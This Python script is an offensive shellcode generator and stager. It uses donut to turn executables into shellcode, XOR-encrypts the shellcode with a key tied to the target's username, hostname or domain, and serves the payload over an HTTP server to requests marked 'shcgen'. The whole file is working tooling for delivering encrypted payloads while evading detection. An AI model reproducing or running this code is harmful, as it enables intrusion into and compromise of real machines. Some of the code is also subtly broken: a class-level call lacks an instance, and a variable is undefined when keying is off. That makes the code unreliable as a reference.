#!/usr/bin/env python3
import sys
import binascii
import traceback
import os, tempfile
import http.server
import contextlib, socket
try:
    import donut
except ModuleNotFoundError:
    print("Please install the pip module donut-shellcode")
    sys.exit(1)

class ShellcodeGenerator:
    SKIPDONUT=False

    KEYCOMP = {
        'NONE': 0,
        'PASSWORD': 1,
        'USERNAME': 2,
        'HOSTNAME': 3,
        'DOMAIN': 4
    }

    def __init__(self, keying=True):
        self.keying = keying

    def generate_key(self, key_info, key_components):
        self.key_info = key_info
        self.key_components = key_components
        self.keycode = ''.join([str(n) for n in self.key_components])
        self.key = ''.join([self.key_info[k] for k in self.key_components])
        return self.key

    def get_xor_key(self):
        return self.key

    @staticmethod
    def xor(shellcode, key):
        return bytes([shellcode[i]^ord(key[i%len(key)]) for i in range(len(shellcode))])

    @staticmethod
    def getRawDonutShellcode(inputfile):
        if ShellcodeGenerator.SKIPDONUT:
            with open(inputfile, "rb") as f:
                return f.read()
        else:
            if sys.platform == 'win32':
                try:
                    shellcode = donut.create(
                        inputfile,
                        params="PARAMS_PLACEHOLDER",
                        entropy=2,
                        compress=1
                    )
                except TypeError:
                    print("WARNING: It was not possible to set entropy due to an outdated donut-shellcode pip, runtime parameters have been disabled.")
                    print("Compile the python module from the github repo to fix this issue.")
                    shellcode = donut.create(
                        inputfile)
            else:
                try:
                    shellcode = donut.create(
                        file=inputfile,
                        output='/dev/null',
                        params="PARAMS_PLACEHOLDER",
                        entropy=2,
                        compress=1
                    )
                except TypeError:
                    print("WARNING: It was not possible to set entropy due to an outdated donut-shellcode pip, runtime parameters have been disabled.")
                    print("Compile the python module from the github repo to fix this issue.")
                    shellcode = donut.create(
                        file=inputfile,
                        output='/dev/null')
            return shellcode

    def generate_shellcode(self, filename):
        raw_shellcode = self.getRawDonutShellcode(filename)
        if self.keying:
            keyed_shellcode = self.xor(raw_shellcode, self.key)
            keycode = self.keycode
        else:
            keycode = str(ShellcodeGenerator.KEYCOMP['NONE'])
        return b"LOLZ" + keycode.encode('UTF8') + b'\r\n' + binascii.hexlify(keyed_shellcode) + b'\r\n'

class ShellcodeHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    MARKER_PARAM = 'shcgen'
    generator = None

    def __init__(self, *args, **kwargs):
        self.tempdir = tempfile.TemporaryDirectory()
        super().__init__(*args, **kwargs)

    def __del__(self):
        del self.tempdir

    # Hijack shellcode requests
    def translate_path(self, path: str) -> str:
        # Check if it has the marker parameter
        original_path = path
        path = super().translate_path(path)
        if '?' in original_path and original_path.split('#', 1)[0].split('?')[1] == self.MARKER_PARAM:
            # it's a shellcode request
            print(f"Detected shellcode request for {os.path.basename(path)}")
            if os.path.isfile(path + '.exe'):
                path = path + '.exe'
            if os.path.isfile(path):
                try:
                    shellcodefile = os.path.join(self.tempdir.name, os.path.basename(path))
                    if not os.path.exists(shellcodefile):
                        print(f"Generating shellcode...")
                        with open(shellcodefile, 'wb') as f:
                            f.write(self.generator.generate_shellcode(path))
                    print(f"Returning hijacked path {shellcodefile}")
                    return shellcodefile
                except Exception:
                    print("Shellcode generation failed!")
                    traceback.print_exc()

        return path

    @staticmethod
    def serve(generator, bind, port, directory):
        class DualStackServer(http.server.ThreadingHTTPServer):
            def server_bind(self):
                # suppress exception when protocol is IPv4
                with contextlib.suppress(Exception):
                    self.socket.setsockopt(
                        socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
                return super().server_bind()
            def finish_request(self, request, client_address):
                self.RequestHandlerClass(request, client_address, self,
                                            directory=directory)

        ShellcodeHTTPRequestHandler.generator = generator
        DualStackServer.address_family, addr = http.server._get_best_family(bind, port)
        ShellcodeHTTPRequestHandler.protocol_version = 'HTTP/1.0'
        with DualStackServer(addr, ShellcodeHTTPRequestHandler) as httpd:
            host, port = httpd.socket.getsockname()[:2]
            url_host = f'[{host}]' if ':' in host else host
            print(
                f"Serving HTTP on {host} port {port} "
                f"(http://{url_host}:{port}/) ..."
            )
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                print("\nKeyboard interrupt received, exiting.")
                sys.exit(0)

def usage():
    print("Usage: " + sys.argv[0] + " [OPTIONS] <input.exe|-S [connection string]>")
    print("\t-n\tDon't use keying, has preference over other options (Default is Key by DOMAIN)")
    print("Keying Options:")
    print("Note: The order in which the arguments are specified determines the order in the key")
    print("\t-u [user]\t Add Username to the key")
    print("\t-h [hostname]\t Add Hostname to the key")
    print("\t-d [domain]\t Add Domain to the key")
    print("\t-p [passwd]\t Add a custom Password to the key")
    print("\t-S [connection string]]\t Start the HTTP Server on host:port (default: 0.0.0.0:8080)")

if __name__ == "__main__":
    key_components = []
    key_info = {}
    keying = True
    filename = None
    http_server = False
    http_port = 8080
    http_ip = None
    
    if len(sys.argv) == 1:
        usage()
        sys.exit()

    # Parse args
    i=1
    while i < len(sys.argv):
        if sys.argv[i] == "-n":
            keying = False
        elif sys.argv[i] == "-u":
            key_components.append(ShellcodeGenerator.KEYCOMP['USERNAME'])
            if i+1 < len(sys.argv) and not sys.argv[i+1].startswith("-"):
                key_info[ShellcodeGenerator.KEYCOMP['USERNAME']] = sys.argv[i+1]
                i+=1
        elif sys.argv[i] == "-h":
            key_components.append(ShellcodeGenerator.KEYCOMP['HOSTNAME'])
            if i+1 < len(sys.argv) and not sys.argv[i+1].startswith("-"):
                key_info[ShellcodeGenerator.KEYCOMP['HOSTNAME']] = sys.argv[i+1]
                i+=1
        elif sys.argv[i] == "-d":
            key_components.append(ShellcodeGenerator.KEYCOMP['DOMAIN'])
            if i+1 < len(sys.argv) and not sys.argv[i+1].startswith("-"):
                key_info[ShellcodeGenerator.KEYCOMP['DOMAIN']] = sys.argv[i+1]
                i+=1
        elif sys.argv[i] == "-p":
            key_components.append(ShellcodeGenerator.KEYCOMP['PASSWORD'])
            if i+1 < len(sys.argv) and not sys.argv[i+1].startswith("-"):
                key_info[ShellcodeGenerator.KEYCOMP['PASSWORD']] = sys.argv[i+1]
                i+=1
        elif sys.argv[i] == "-S":
            http_server = True
            if i+1 < len(sys.argv) and not sys.argv[i+1].startswith("-"):
                try:
                    http_ip = sys.argv[i+1].split(':')[0]
                    http_port=int(sys.argv[i+1].split(':')[1])
                    i+=1
                except Exception:
                    print("Cannot parse HTTP Connection String: " + sys.argv[i+1])
                    print("Please use the format IP:Port")
                    sys.exit(-1)
        elif (not sys.argv[i].startswith("-")) and filename is None:
            # Positional args, only filename for now
            filename = sys.argv[i]
        else:
            print("Wrong argument: " + sys.argv[i])
            usage()
            sys.exit(-1)
        i+=1

    if filename is None and not http_server:
        print("Please specify a file name or start the HTTP server with -S.")
        sys.exit(-1)
    elif filename and http_server:
        print("Cannot select HTTP mode (-S) and a filename. Choose one or the other.")
        sys.exit(-1)

    # PARSE KEY COMPONENTS
    if keying and len(key_components)==0:
        key_components.append(ShellcodeGenerator.KEYCOMP['DOMAIN'])
    
    generator = ShellcodeGenerator(keying)
    if keying:
        # Ask for missing params
        for k,v in ShellcodeGenerator.KEYCOMP.items():
            if v in key_components and v not in key_info:
                    key_info[v] = input(k + ": ").strip()
                    
        # Generate key
        print("XOR KEY:", generator.generate_key(key_info, key_components))

    if (filename):
        # Generate shellcode
        shellcode = ShellcodeGenerator.generate_shellcode(filename)

        print("Shellcode length:", len(shellcode))
        
        outfile = filename + ".bin"
        with open(outfile, "wb") as f:
            f.write(shellcode)
        print("Output written to " + outfile)
    elif http_server:
        ShellcodeHTTPRequestHandler.serve(generator=generator, port=http_port, bind=http_ip, directory=os.getcwd())